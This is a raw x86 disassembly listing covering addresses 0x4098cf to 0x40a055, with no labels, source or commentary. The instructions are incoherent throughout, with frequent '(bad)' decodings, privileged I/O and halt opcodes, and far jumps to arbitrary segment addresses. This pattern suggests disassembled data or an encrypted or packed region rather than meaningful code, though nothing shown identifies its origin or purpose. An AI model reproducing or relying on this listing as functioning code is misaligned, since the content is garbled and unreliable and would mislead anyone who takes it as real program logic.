  4098cf:	cmc    
  4098d0:	cmp    ebp,DWORD PTR [ebp-0x7c6f2f74]
  4098d6:	adc    eax,0x397bbc02
  4098db:	outs   dx,BYTE PTR ds:[esi]
  4098dc:	or     al,0xc
  4098de:	jge    0x4098b5
  4098e0:	pop    es
  4098e1:	rol    ch,1
  4098e3:	jb     0x409899
  4098e5:	jmp    0x8b206fc7
  4098ea:	inc    esp
  4098eb:	data16 rcl BYTE PTR [ebx+0x7394864f],0x4d
  4098f3:	push   0xad7fdbf5
  4098f8:	fldcw  WORD PTR [eax+0x6095ddb5]
  4098fe:	mov    ds,WORD PTR [edx-0x430456af]
  409904:	inc    eax
  409905:	jne    0x4098a2
  409907:	add    eax,0xf51e5f75
  40990c:	stos   BYTE PTR es:[edi],al
  40990d:	sbb    ecx,0xe265f4df
  409913:	sub    eax,0xd0d56e75
  409918:	iret   
  409919:	jb     0x409920
  40991b:	push   0xdb97f701
  409920:	jmp    0xde07:0xe76f3d1c
  409927:	ins    DWORD PTR es:[edi],dx
  409928:	test   DWORD PTR [ebp-0x72a8441],0xe823872b
  409932:	test   DWORD PTR [ebp+esi*4-0x7c8a66c5],esi
  409939:	dec    edx
  40993a:	mov    ?,WORD PTR [eax+ecx*4+0x27]
  40993e:	test   edx,ebx
  409940:	dec    eax
  409941:	xor    eax,DWORD PTR [ecx]
  409943:	dec    esp
  409944:	mov    eax,es:0x4d27d6bf
  40994a:	in     al,dx
  40994b:	and    DWORD PTR [ebx],esp
  40994d:	inc    ecx
  40994e:	(bad)  
  40994f:	fs cmp eax,0xb011654c
  409955:	jb     0x4098e3
  409957:	(bad)  
  409958:	dec    esi
  409959:	sbb    BYTE PTR [ebx-0x2c588782],ch
  40995f:	out    dx,al
  409960:	ins    BYTE PTR es:[edi],dx
  409961:	jmp    0x40995b
  409963:	mov    ah,0x83
  409965:	xchg   ebx,eax
  409966:	dec    edx
  409967:	test   eax,0x4b525350
  40996c:	mov    dh,dh
  40996e:	or     bh,al
  409970:	sti    
  409971:	int    0xfa
  409973:	xchg   ebp,eax
  409974:	mov    cl,0xfe
  409976:	cmp    eax,0x4ca6a93c
  40997b:	and    al,0x40
  40997d:	pop    esi
  40997e:	test   al,0xe1
  409980:	fisub  WORD PTR [edx+ebx*8+0x3160cfef]
  409987:	push   ss
  409988:	call   0x4c8f:0x755532b2
  40998f:	outs   dx,BYTE PTR ds:[esi]
  409990:	pop    edi
  409991:	hlt    
  409992:	iret   
  409993:	std    
  409994:	in     al,dx
  409995:	push   esp
  409996:	push   ebx
  409997:	inc    ecx
  409998:	clc    
  409999:	lods   eax,DWORD PTR ds:[esi]
  40999a:	sbb    al,0xa2
  40999c:	fst    DWORD PTR [esi-0x17]
  40999f:	and    dl,BYTE PTR [esi+0x75ecc1af]
  4099a5:	push   bp
  4099a7:	mov    al,ds:0xfce21e14
  4099ac:	push   ebp
  4099ad:	pusha  
  4099ae:	adc    esp,DWORD PTR [ecx]
  4099b0:	bound  edx,QWORD PTR [ecx+0x35]
  4099b3:	aas    
  4099b4:	icebp  
  4099b5:	add    DWORD PTR ds:0xfdb01637,edi
  4099bb:	adc    al,0x92
  4099bd:	std    
  4099be:	mov    DWORD PTR [edx+edi*8+0x10208632],0x39f2946d
  4099c9:	rol    BYTE PTR [ecx-0x27],0xc9
  4099cd:	mov    cl,0x34
  4099cf:	xor    BYTE PTR ds:0x67d06e77,dl
  4099d5:	je     0x409965
  4099d7:	jle    0x409a32
  4099d9:	aam    0xce
  4099db:	sbb    edx,esi
  4099dd:	push   esi
  4099de:	add    esp,eax
  4099e0:	xchg   DWORD PTR [esi],edx
  4099e2:	mov    esi,0xeb5b4b2e
  4099e7:	sbb    al,0x95
  4099e9:	test   BYTE PTR [ecx-0x2c],cl
  4099ec:	pop    es
  4099ed:	add    dh,BYTE PTR [edx+0x3b45cea0]
  4099f3:	outs   dx,BYTE PTR ds:[esi]
  4099f4:	imul   ecx,DWORD PTR [ebp+0x2704004b],0xffffffd1
  4099fb:	add    BYTE PTR [esi+0x38],ah
  4099fe:	call   0x7996:0x4fe641
  409a05:	lea    ebp,[edi-0x1a]
  409a08:	sbb    ecx,DWORD PTR [eax-0x286a41b0]
  409a0e:	jge    0x4099eb
  409a10:	out    dx,eax
  409a11:	imul   edi,esp,0x79800aca
  409a17:	mov    dh,0x34
  409a19:	js     0x409a5d
  409a1b:	ds jno 0x409a78
  409a1e:	jp     0x4099ac
  409a20:	dec    ecx
  409a21:	ret    0xb1e
  409a24:	in     al,dx
  409a25:	push   esp
  409a26:	mov    ebx,0xf49d73b4
  409a2b:	pop    es
  409a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a2d:	rol    BYTE PTR ss:[eax-0x14],0x2b
  409a32:	(bad)  [edx-0x2d]
  409a35:	mov    cl,0x1a
  409a37:	jbe    0x409a61
  409a39:	cwde   
  409a3a:	jge    0x409a59
  409a3c:	int    0x8d
  409a3e:	lahf   
  409a3f:	out    0xfe,al
  409a41:	push   ds
  409a42:	inc    ecx
  409a43:	shr    al,cl
  409a45:	lods   eax,DWORD PTR ds:[esi]
  409a46:	mov    al,0x84
  409a48:	scas   eax,DWORD PTR es:[edi]
  409a49:	dec    esp
  409a4a:	out    dx,al
  409a4b:	lods   al,BYTE PTR ds:[esi]
  409a4c:	dec    edx
  409a4d:	push   ss
  409a4e:	push   eax
  409a4f:	xchg   ebp,eax
  409a50:	loope  0x409a69
  409a52:	sbb    dl,BYTE PTR [edi]
  409a54:	mov    al,ds:0xfeda20e8
  409a59:	fisubr WORD PTR [edx]
  409a5b:	jge    0x4099e6
  409a5d:	call   0x5e0f412d
  409a62:	test   dh,0xe3
  409a65:	mov    esi,0x349f106e
  409a6a:	outs   dx,BYTE PTR ds:[esi]
  409a6b:	fcmovnu st,st(2)
  409a6d:	fdiv   st,st(7)
  409a6f:	push   ss
  409a70:	pop    ebx
  409a71:	sub    BYTE PTR [esi],0x55
  409a74:	jb     0x409a34
  409a76:	outs   dx,BYTE PTR ds:[esi]
  409a77:	call   0xc1c562db
  409a7c:	jecxz  0x409ac6
  409a7e:	mov    ds:0xb321062c,eax
  409a83:	push   ecx
  409a84:	sahf   
  409a85:	pop    ss
  409a86:	cmp    al,BYTE PTR ds:0x74ebfc1d
  409a8c:	push   cs
  409a8d:	lahf   
  409a8e:	mul    ah
  409a90:	(bad)  
  409a91:	pop    ds
  409a92:	bswap  ecx
  409a94:	das    
  409a95:	xchg   ecx,eax
  409a96:	mov    esi,0x924c8b53
  409a9b:	gs dec esi
  409a9d:	mov    bl,0xaa
  409a9f:	add    ch,cl
  409aa1:	xchg   ecx,eax
  409aa2:	inc    edi
  409aa3:	(bad)  
  409aa4:	dec    edi
  409aa5:	repnz push 0x4244e24c
  409aab:	cmc    
  409aac:	outs   dx,DWORD PTR ds:[esi]
  409aad:	scas   al,BYTE PTR es:[edi]
  409aae:	inc    eax
  409aaf:	xchg   esi,eax
  409ab0:	imul   eax,DWORD PTR [edx+0x2],0xcb6198b7
  409ab7:	fisttp QWORD PTR ds:0x7fbad802
  409abd:	cmp    al,BYTE PTR [edx+0x59]
  409ac0:	add    BYTE PTR [esi-0x1875d644],ch
  409ac6:	fs inc ecx
  409ac8:	cli    
  409ac9:	ret    0x6aec
  409acc:	inc    esp
  409acd:	aaa    
  409ace:	mov    al,ds:0xa1bdd87e
  409ad3:	adc    al,cl
  409ad5:	adc    BYTE PTR [ecx],bh
  409ad7:	fistp  DWORD PTR [eax]
  409ad9:	in     eax,0x31
  409adb:	ret    0x8bd5
  409ade:	in     eax,dx
  409adf:	stc    
  409ae0:	addr16 sbb ah,dl
  409ae3:	loopne 0x409b29
  409ae5:	std    
  409ae6:	daa    
  409ae7:	and    eax,0xa2073bc9
  409aec:	jl     0x409afb
  409aee:	test   dh,0xed
  409af1:	rcr    ch,0x42
  409af4:	icebp  
  409af5:	mov    ch,0x10
  409af7:	jle    0x409a96
  409af9:	aad    0x38
  409afb:	xchg   ebp,eax
  409afc:	ss sar cl,0x8
  409b00:	inc    edi
  409b01:	inc    esp
  409b02:	adc    esp,DWORD PTR [edi+0x48aad8cd]
  409b08:	rcr    BYTE PTR ds:0x8e2a3db6,1
  409b0e:	pushf  
  409b0f:	pop    ds
  409b10:	push   ds
  409b11:	lock sar DWORD PTR [edx-0x52],0xf
  409b16:	xchg   esp,eax
  409b17:	jl     0x409aa1
  409b19:	jne    0x409ad4
  409b1b:	div    BYTE PTR [esi]
  409b1d:	pushf  
  409b1e:	mov    cl,bl
  409b20:	push   ss
  409b21:	loopne 0x409aa9
  409b23:	mov    eax,?
  409b25:	scas   al,BYTE PTR es:[edi]
  409b26:	mov    ch,0x68
  409b28:	dec    edx
  409b29:	push   cs
  409b2a:	sahf   
  409b2b:	repz test BYTE PTR [esp+eax*1-0xe689616],bh
  409b33:	sahf   
  409b34:	add    al,0x93
  409b36:	les    edi,FWORD PTR [esi+0x77cd366a]
  409b3c:	xor    ah,BYTE PTR [eax+0x357fc110]
  409b42:	ret    0x8a8e
  409b45:	lds    edx,FWORD PTR [edi]
  409b47:	pop    esi
  409b48:	(bad)  
  409b49:	adc    eax,0xbfcfb540
  409b4e:	mov    bl,0xeb
  409b50:	(bad)  
  409b51:	ficom  DWORD PTR [ebx+0x4cc56726]
  409b57:	mov    ds:0x685931ce,al
  409b5c:	arpl   WORD PTR [ebp+0x5f],sp
  409b5f:	pop    edi
  409b60:	sbb    BYTE PTR [ecx+0x6898ab59],bh
  409b66:	inc    edi
  409b67:	aam    0x5
  409b69:	xchg   ecx,eax
  409b6a:	out    0x5e,al
  409b6c:	jo     0x409b2a
  409b6e:	lock push es
  409b70:	fstp   QWORD PTR [esi-0x3004c05a]
  409b76:	iret   
  409b77:	dec    edi
  409b78:	mov    ebp,DWORD PTR [edx+0x5e]
  409b7b:	aam    0xf3
  409b7d:	sbb    BYTE PTR [edi],ch
  409b7f:	out    0xe0,eax
  409b81:	xchg   esp,eax
  409b82:	mov    dh,0xa8
  409b84:	sub    ebx,DWORD PTR [ecx+0x44c39d14]
  409b8a:	enter  0xe16d,0xc0
  409b8e:	xor    DWORD PTR [esp+esi*4+0x92bf6d4],ebp
  409b95:	out    0x55,eax
  409b97:	fld    QWORD PTR [eax+0x16]
  409b9a:	bnd jbe 0x409ba7
  409b9d:	scas   al,BYTE PTR es:[edi]
  409b9e:	xor    ebx,ebp
  409ba0:	and    esp,DWORD PTR [edi]
  409ba2:	je     0x409b29
  409ba4:	sub    esp,DWORD PTR [esi+edx*2+0x1]
  409ba8:	ret    
  409ba9:	scas   al,BYTE PTR es:[edi]
  409baa:	sub    edx,DWORD PTR [ebx-0x60]
  409bad:	cmp    DWORD PTR [edi+0x71],0xffffffc7
  409bb1:	sbb    BYTE PTR [ecx+0x5e865834],cl
  409bb7:	je     0x409c32
  409bb9:	outs   dx,DWORD PTR ds:[esi]
  409bba:	in     eax,0x5b
  409bbc:	pop    es
  409bbd:	pop    ecx
  409bbe:	sbb    dh,dh
  409bc0:	test   al,0xe
  409bc2:	dec    ecx
  409bc3:	lahf   
  409bc4:	leave  
  409bc5:	mov    eax,0xcf2a30c9
  409bca:	(bad)  
  409bcb:	lods   eax,DWORD PTR ds:[esi]
  409bcc:	inc    edx
  409bcd:	mov    ds:0x4ee2ff70,al
  409bd2:	stos   DWORD PTR es:[edi],eax
  409bd3:	aam    0x56
  409bd5:	mov    bh,0xec
  409bd7:	daa    
  409bd8:	stos   BYTE PTR es:[edi],al
  409bd9:	xor    al,0xf1
  409bdb:	mov    ecx,0xfc651e2a
  409be0:	scas   al,BYTE PTR es:[edi]
  409be1:	push   cs
  409be2:	cmc    
  409be3:	sbb    DWORD PTR [ebx-0x669c0000],ebp
  409be9:	gs cmc 
  409beb:	arpl   WORD PTR fs:[ebp+0x156e022d],di
  409bf2:	mov    al,0x15
  409bf4:	mov    dh,0x2b
  409bf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bf7:	ret    0xcf65
  409bfa:	fmul   st,st(7)
  409bfc:	popf   
  409bfd:	cdq    
  409bfe:	(bad)  
  409bff:	jnp    0x409c02
  409c01:	and    ch,BYTE PTR [eax+0x6d]
  409c04:	push   eax
  409c05:	push   ds
  409c06:	add    BYTE PTR [ebx+esi*2+0x54],cl
  409c0a:	jp     0x409be4
  409c0c:	push   ecx
  409c0d:	push   edx
  409c0e:	aaa    
  409c0f:	test   eax,0x76d757a8
  409c14:	call   0x341895e1
  409c19:	in     al,dx
  409c1a:	stc    
  409c1b:	xchg   ebp,eax
  409c1c:	dec    edx
  409c1d:	mov    eax,0x96b6ba15
  409c22:	push   ds
  409c23:	cmc    
  409c24:	add    al,0x75
  409c26:	les    ebp,FWORD PTR [esi]
  409c28:	and    DWORD PTR [edx+ecx*8-0x3c],edx
  409c2c:	inc    esp
  409c2d:	inc    eax
  409c2e:	shl    BYTE PTR [edx],1
  409c30:	mov    cl,0x91
  409c32:	inc    edx
  409c33:	in     eax,0x2b
  409c35:	inc    esp
  409c36:	cmp    al,0x3a
  409c38:	sbb    eax,0x6af0a6e5
  409c3d:	iret   
  409c3e:	int3   
  409c3f:	jne    0x409c2d
  409c41:	out    dx,al
  409c42:	(bad)  
  409c44:	add    ecx,DWORD PTR [edx+eiz*2+0x51]
  409c48:	or     ch,bl
  409c4a:	inc    ebp
  409c4b:	jns    0x409bd2
  409c4d:	cmp    al,0xfd
  409c4f:	mov    ah,0xdb
  409c51:	popf   
  409c52:	mov    ebx,0x5633dd6a
  409c57:	pop    esp
  409c58:	ror    DWORD PTR [edx-0x6dd7e6f],cl
  409c5e:	(bad)
  409c61:	push   ebp
  409c62:	test   eax,0x55c5dcb6
  409c67:	hlt    
  409c68:	dec    ebx
  409c69:	(bad)  
  409c6a:	cdq    
  409c6b:	push   edi
  409c6c:	jl     0x409c72
  409c6e:	(bad)  
  409c6f:	es jmp 0x409ca7
  409c72:	int    0x21
  409c74:	mov    al,ds:0x6694e2c6
  409c79:	push   esp
  409c7a:	or     ecx,DWORD PTR [ebx+eax*8+0x1668020c]
  409c81:	loopne 0x409c99
  409c83:	fiadd  WORD PTR [edi]
  409c85:	ja     0x409cb3
  409c87:	ret    
  409c88:	sbb    ch,BYTE PTR [edx-0x50]
  409c8b:	(bad)  
  409c8c:	stc    
  409c8d:	std    
  409c8e:	fs dec ebx
  409c90:	jbe    0x409ce2
  409c92:	rol    BYTE PTR [edi],cl
  409c94:	fadd   DWORD PTR [edx-0x20]
  409c97:	lods   al,BYTE PTR ds:[esi]
  409c98:	xor    DWORD PTR [ebp-0x5f],ebx
  409c9b:	adc    edi,0xffffffb4
  409c9e:	mov    ecx,0x736e66cf
  409ca3:	iret   
  409ca4:	loop   0x409cd9
  409ca6:	in     eax,dx
  409ca7:	pusha  
  409ca8:	sub    DWORD PTR [ebp-0x22],ebp
  409cab:	ds xor al,0x8e
  409cae:	push   esi
  409caf:	pop    ecx
  409cb0:	repz inc BYTE PTR [edi+0x55ece7da]
  409cb7:	lds    esi,FWORD PTR [eax-0x14]
  409cba:	mov    ebp,0x2abecb8c
  409cbf:	mov    dl,0x67
  409cc1:	and    DWORD PTR [eax+edx*1-0xfc34dda],eax
  409cc8:	cdq    
  409cc9:	mov    esp,0xcdab1b08
  409cce:	pop    ds
  409ccf:	mov    dl,0xf
  409cd1:	cdq    
  409cd2:	stos   BYTE PTR es:[edi],al
  409cd3:	cli    
  409cd4:	popa   
  409cd5:	or     al,0xf2
  409cd7:	addr16 loope 0x409cce
  409cda:	(bad)  [edx+eiz*1-0x25]
  409cde:	fidivr WORD PTR [esi]
  409ce0:	xchg   edi,eax
  409ce1:	xchg   edi,eax
  409ce2:	dec    ebx
  409ce3:	add    DWORD PTR [edi-0x8],ecx
  409ce6:	loop   0x409d2e
  409ce8:	in     al,0x99
  409cea:	xor    esi,esp
  409cec:	cmp    BYTE PTR [ebx-0x80],ah
  409cef:	cmp    eax,0xa3b31fdf
  409cf4:	dec    eax
  409cf5:	mov    ah,0x3
  409cf7:	cmp    al,0xc6
  409cf9:	dec    esp
  409cfa:	or     eax,0x1ae9ebdb
  409cff:	inc    eax
  409d00:	js     0x409d50
  409d02:	lea    edi,[ebx+eax*2]
  409d05:	retf   0x561c
  409d08:	fs mov ebx,0x14683e4
  409d0e:	push   ds
  409d0f:	je     0x409cbe
  409d11:	imul   esi,eax,0x17ea2b7e
  409d17:	dec    edi
  409d18:	bound  ebp,QWORD PTR [ecx+0x1d]
  409d1b:	jge    0x409d79
  409d1d:	pusha  
  409d1e:	stc    
  409d1f:	push   edi
  409d20:	pop    edx
  409d21:	(bad)  
  409d22:	xchg   ecx,eax
  409d23:	aam    0xaa
  409d25:	cmc    
  409d26:	jecxz  0x409d63
  409d28:	inc    edi
  409d29:	xchg   ebx,eax
  409d2a:	out    dx,al
  409d2b:	and    al,0x67
  409d2d:	retf   
  409d2e:	add    eax,0x644a8902
  409d33:	xchg   ecx,eax
  409d34:	loope  0x409d49
  409d36:	xor    DWORD PTR [esi+0x4d],0x543c5b23
  409d3d:	xchg   ebx,eax
  409d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d3f:	jbe    0x409d06
  409d41:	bnd jmp 0x544ffc86
  409d47:	or     BYTE PTR [edi],dh
  409d49:	jl     0x409da4
  409d4b:	test   eax,0x8eaceb2d
  409d50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d51:	scas   eax,DWORD PTR es:[edi]
  409d52:	inc    eax
  409d53:	in     al,dx
  409d54:	xchg   al,dl
  409d56:	inc    esp
  409d57:	xor    BYTE PTR [ebp-0x57e046a7],dl
  409d5d:	js     0x409cf7
  409d5f:	push   ebx
  409d60:	sbb    edx,edi
  409d62:	and    al,0x7a
  409d64:	imul   edx,DWORD PTR [esi+0x43],0x25
  409d68:	rol    dl,cl
  409d6a:	pushf  
  409d6b:	test   al,0xde
  409d6d:	jnp    0x409d30
  409d6f:	hlt    
  409d70:	stos   BYTE PTR es:[edi],al
  409d71:	inc    edx
  409d72:	and    eax,DWORD PTR [eax-0x17]
  409d75:	pop    es
  409d76:	xchg   edi,eax
  409d77:	and    eax,0xe13e4c89
  409d7c:	push   cs
  409d7d:	retf   
  409d7e:	inc    ecx
  409d7f:	out    dx,eax
  409d80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d81:	loopne 0x409daa
  409d83:	adc    eax,0xa5d3d8c4
  409d88:	cmp    cl,bh
  409d8a:	test   BYTE PTR [ebp-0x4fc96947],dh
  409d90:	cmc    
  409d91:	mov    edx,0x5ca7c782
  409d96:	jecxz  0x409d9a
  409d98:	test   ecx,edi
  409d9a:	sub    al,0xd1
  409d9c:	mov    WORD PTR [ecx+0x56],ss
  409d9f:	mov    ds:0x9f318425,eax
  409da4:	lahf   
  409da5:	mov    esp,0xaaf6ad9
  409daa:	xchg   BYTE PTR [edx+eax*1-0x2f],dh
  409dae:	push   ecx
  409daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409db0:	shl    BYTE PTR [edi+0x5a9124fe],cl
  409db6:	fmul   QWORD PTR [edi]
  409db8:	add    esi,ecx
  409dba:	cli    
  409dbb:	jnp    0x409d70
  409dbd:	scas   eax,DWORD PTR es:[edi]
  409dbe:	sbb    edx,edi
  409dc0:	scas   eax,DWORD PTR es:[edi]
  409dc1:	push   eax
  409dc2:	shl    al,cl
  409dc4:	mov    dl,0x8e
  409dc6:	mov    edx,0xc45e865e
  409dcb:	adc    BYTE PTR [ebx],ah
  409dcd:	shl    DWORD PTR [edi-0x63b6cca5],cl
  409dd3:	mul    DWORD PTR [ebx+0x4c]
  409dd6:	inc    edx
  409dd7:	int3   
  409dd8:	mov    ch,0xd7
  409dda:	xor    eax,0x6547f772
  409ddf:	jecxz  0x409dfd
  409de1:	mov    cl,0xa9
  409de3:	jge    0x409d9a
  409de5:	aaa    
  409de6:	shl    BYTE PTR [edx],0x94
  409de9:	push   edi
  409dea:	retf   
  409deb:	sub    BYTE PTR [eax-0x33],0x84
  409def:	je     0x409de4
  409df1:	ds lock dec esp
  409df4:	(bad)  
  409df5:	push   ebx
  409df6:	shl    bh,1
  409df8:	rcl    BYTE PTR [edx+0x15],cl
  409dfb:	dec    ebp
  409dfc:	mov    ecx,ebp
  409dfe:	jl     0x409e5d
  409e00:	outs   dx,BYTE PTR ds:[esi]
  409e01:	outs   dx,BYTE PTR ds:[esi]
  409e02:	cmp    BYTE PTR [ebx-0x4],bh
  409e05:	mov    cl,0xb5
  409e07:	stos   BYTE PTR es:[edi],al
  409e08:	retf   
  409e09:	into   
  409e0a:	sahf   
  409e0b:	jecxz  0x409e30
  409e0d:	fs push ebx
  409e0f:	test   eax,0x35d5ef1
  409e14:	(bad)  
  409e15:	hlt    
  409e16:	cwde   
  409e17:	pusha  
  409e18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e19:	mov    ah,0xc5
  409e1b:	mov    eax,ds:0x5f849da7
  409e20:	ins    DWORD PTR es:[edi],dx
  409e21:	mov    dl,0x40
  409e23:	add    BYTE PTR [ebx],bl
  409e25:	lods   eax,DWORD PTR ds:[esi]
  409e26:	jns    0x409dad
  409e28:	adc    al,0xb0
  409e2a:	jmp    0xcfa6:0x33d7b76a
  409e31:	lods   al,BYTE PTR ds:[esi]
  409e32:	aaa    
  409e33:	in     eax,dx
  409e34:	(bad)  
  409e35:	addr16 in eax,dx
  409e37:	fst    DWORD PTR [ebx+edi*4]
  409e3a:	xor    eax,0xc48be9da
  409e3f:	dec    edx
  409e40:	loop   0x409e3a
  409e42:	mov    dh,0xc2
  409e44:	pop    edi
  409e45:	cld    
  409e46:	(bad)  
  409e48:	adc    eax,0x83adb685
  409e4d:	aad    0x5
  409e4f:	fild   WORD PTR ds:0x2e0b6b43
  409e55:	inc    esi
  409e56:	in     eax,dx
  409e57:	clc    
  409e58:	pushf  
  409e59:	loop   0x409eb6
  409e5b:	mov    edi,0x1b648e8a
  409e60:	sbb    dh,bl
  409e62:	mov    esp,esp
  409e64:	pop    ebx
  409e65:	test   al,ah
  409e67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e68:	jecxz  0x409ecd
  409e6a:	sbb    ecx,esp
  409e6c:	sub    esp,DWORD PTR [edx+0x74]
  409e6f:	xchg   esi,edx
  409e71:	icebp  
  409e72:	cdq    
  409e73:	pop    ecx
  409e74:	cmp    ch,al
  409e76:	or     eax,0xfe9b313e
  409e7b:	mov    edx,0x4a2019d0
  409e80:	popa   
  409e81:	fimul  DWORD PTR [edx+0x66]
  409e84:	adc    BYTE PTR [edx-0x10c4c8fb],0x7d
  409e8b:	and    DWORD PTR [ebp+edx*2-0x5d],edi
  409e8f:	sub    al,0x6a
  409e91:	pop    eax
  409e92:	mov    al,ds:0x65b3d384
  409e97:	xor    BYTE PTR [esp+eiz*8-0x79d39df6],bh
  409e9e:	out    dx,al
  409e9f:	push   ss
  409ea0:	add    DWORD PTR [ebp+0x1b],0x4
  409ea4:	int    0xf3
  409ea6:	iret   
  409ea7:	pop    edi
  409ea8:	xor    al,0xe5
  409eaa:	mov    esp,0x8755567e
  409eaf:	adc    al,0x4a
  409eb1:	cmc    
  409eb2:	or     al,0xbf
  409eb4:	and    BYTE PTR [esi+0x1f],bl
  409eb7:	sub    bl,bh
  409eb9:	and    esp,ebx
  409ebb:	pusha  
  409ebc:	xchg   ebx,eax
  409ebd:	mov    dl,0xa5
  409ebf:	and    al,0x43
  409ec1:	inc    esi
  409ec2:	pop    esp
  409ec3:	es sahf 
  409ec5:	ret    0x399a
  409ec8:	xchg   ebp,eax
  409ec9:	mov    ch,0xef
  409ecb:	arpl   si,bp
  409ecd:	and    DWORD PTR [ebx],0x5b6a018c
  409ed3:	adc    BYTE PTR [eax+eiz*2],ch
  409ed6:	push   ss
  409ed7:	mov    eax,ds:0x8dafa939
  409edc:	stc    
  409edd:	shl    BYTE PTR [edi+0x4348031f],cl
  409ee3:	xchg   ebp,eax
  409ee4:	pop    ss
  409ee5:	lock push eax
  409ee7:	jmp    0x409ea4
  409ee9:	les    eax,FWORD PTR [eax+0x5cf1018a]
  409eef:	lahf   
  409ef0:	sub    al,0x39
  409ef2:	xchg   ebp,eax
  409ef3:	gs or  ch,bh
  409ef6:	imul   edi,DWORD PTR [ecx-0x71],0x7f
  409efa:	loope  0x409edb
  409efc:	ror    BYTE PTR [edx],1
  409efe:	jne    0x409f4c
  409f00:	fwait
  409f01:	in     al,dx
  409f02:	lods   al,BYTE PTR ds:[esi]
  409f03:	nop
  409f04:	ret    0x9077
  409f07:	(bad)  
  409f08:	fcmovnbe st,st(2)
  409f0a:	shr    BYTE PTR [eax-0x27a94665],cl
  409f10:	js     0x409f8d
  409f12:	dec    eax
  409f13:	cmp    dl,dh
  409f15:	pop    esp
  409f16:	in     al,dx
  409f17:	add    BYTE PTR [edi+ebx*4-0x45],cl
  409f1b:	addr16 push ebx
  409f1d:	mov    eax,0xf641e438
  409f22:	cmp    eax,ebp
  409f24:	and    edi,ebx
  409f26:	shl    DWORD PTR [ecx-0x80],cl
  409f29:	jge    0x409f46
  409f2b:	int    0xc6
  409f2d:	push   ecx
  409f2e:	mov    edx,0x41c753b9
  409f33:	ret    0x26c1
  409f36:	shr    edx,cl
  409f38:	adc    eax,0xa092f511
  409f3d:	fucomp st(6)
  409f3f:	push   edx
  409f40:	(bad)  
  409f41:	xor    dh,BYTE PTR [edi+0x41]
  409f44:	add    edx,DWORD PTR [ebx+esi*1+0x70092062]
  409f4b:	sbb    BYTE PTR [esi+esi*8-0x4f],cl
  409f4f:	sub    DWORD PTR [esi+0x24],edx
  409f52:	cwde   
  409f53:	cmc    
  409f54:	add    eax,eax
  409f56:	fstp   TBYTE PTR [edi+0x3390160d]
  409f5c:	rol    BYTE PTR gs:[esi],0xec
  409f60:	push   es
  409f61:	stos   BYTE PTR es:[edi],al
  409f62:	int3   
  409f63:	and    al,0xfc
  409f65:	(bad)  
  409f66:	je     0x409f21
  409f68:	lods   al,BYTE PTR ds:[esi]
  409f69:	enter  0x8eff,0xda
  409f6d:	and    ecx,esp
  409f6f:	add    BYTE PTR [ebx+0x460d6afd],cl
  409f75:	scas   al,BYTE PTR es:[edi]
  409f76:	mov    dl,BYTE PTR [ecx-0x479f85c1]
  409f7c:	rcr    BYTE PTR [ecx+edx*1-0x7c5100f3],1
  409f83:	aas    
  409f84:	sar    DWORD PTR [esi+0x6b],cl
  409f87:	add    DWORD PTR [eax-0x27],edx
  409f8a:	scas   eax,DWORD PTR es:[edi]
  409f8b:	daa    
  409f8c:	jbe    0x409f5c
  409f8e:	popa   
  409f8f:	pop    ebp
  409f90:	add    al,BYTE PTR [ebx-0x1a]
  409f93:	(bad)  
  409f95:	fcompp 
  409f97:	dec    eax
  409f98:	ret    
  409f99:	pop    ebp
  409f9a:	sub    dh,bl
  409f9c:	jnp    0x409f22
  409f9e:	fnstsw WORD PTR [ebx-0x53]
  409fa1:	jmp    0x5f669bf7
  409fa6:	(bad)  
  409fa7:	mov    ds:0xc4b3c619,al
  409fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fad:	icebp  
  409fae:	push   ds
  409faf:	call   0xc7966d6f
  409fb4:	push   ebx
  409fb5:	dec    eax
  409fb6:	inc    ebp
  409fb7:	ret    
  409fb8:	mov    esp,0xfd5fa20f
  409fbd:	stos   BYTE PTR es:[edi],al
  409fbe:	pop    ebx
  409fbf:	loope  0x409fac
  409fc1:	cmc    
  409fc2:	nop
  409fc3:	cmp    ecx,esi
  409fc5:	std    
  409fc6:	aam    0x6e
  409fc8:	popf   
  409fc9:	bound  eax,QWORD PTR [ebp+0x1c]
  409fcc:	call   0xc336dee5
  409fd1:	mov    esi,0x53cc3f77
  409fd6:	pop    ebx
  409fd7:	adc    al,0x8a
  409fd9:	imul   DWORD PTR [eax]
  409fdb:	mov    esi,0x971efe9f
  409fe0:	cmp    esi,ebx
  409fe2:	adc    al,0xc0
  409fe4:	retf   
  409fe5:	dec    esp
  409fe6:	test   eax,0xbf561558
  409feb:	arpl   WORD PTR [edi+0x33],bp
  409fee:	xchg   edi,eax
  409fef:	mov    esp,0x89616cbb
  409ff4:	sub    DWORD PTR [esi-0x510e229d],edx
  409ffa:	inc    ebp
  409ffb:	lahf   
  409ffc:	adc    al,0xbc
  409ffe:	jmp    0xfcf5:0xc5bde70b
  40a005:	data16 fprem 
  40a008:	mov    BYTE PTR [ecx+0x61],ah
  40a00b:	jns    0x409fa0
  40a00d:	xor    cl,BYTE PTR [eax+ebx*1]
  40a010:	loop   0x409ff9
  40a012:	repz clc 
  40a014:	dec    esi
  40a015:	jle    0x409fb1
  40a017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a018:	and    bh,ch
  40a01a:	push   ecx
  40a01b:	je     0x40a03a
  40a01d:	xchg   esi,eax
  40a01e:	repnz adc eax,0x44860b85
  40a024:	sub    DWORD PTR [edx],edx
  40a026:	mov    es,WORD PTR [ebp+ebp*4-0x49b990a0]
  40a02d:	ret    0x2441
  40a030:	xor    BYTE PTR [ebx],dh
  40a032:	in     eax,dx
  40a033:	adc    cl,dh
  40a035:	(bad)  
  40a037:	(bad)  
  40a038:	mov    esp,0xf685c959
  40a03d:	(bad)  
  40a03e:	mov    eax,ds:0xd0833b15
  40a043:	push   eax
  40a044:	xchg   edi,eax
  40a045:	push   edi
  40a046:	cmp    BYTE PTR [edx],bl
  40a048:	cwde   
  40a049:	dec    eax
  40a04a:	jae    0x40a01f
  40a04c:	pop    edi
  40a04d:	call   0xf23d9320
  40a052:	pushf  
  40a053:	rdtsc  
  40a055:	sbb    eax,0x6e1fff98
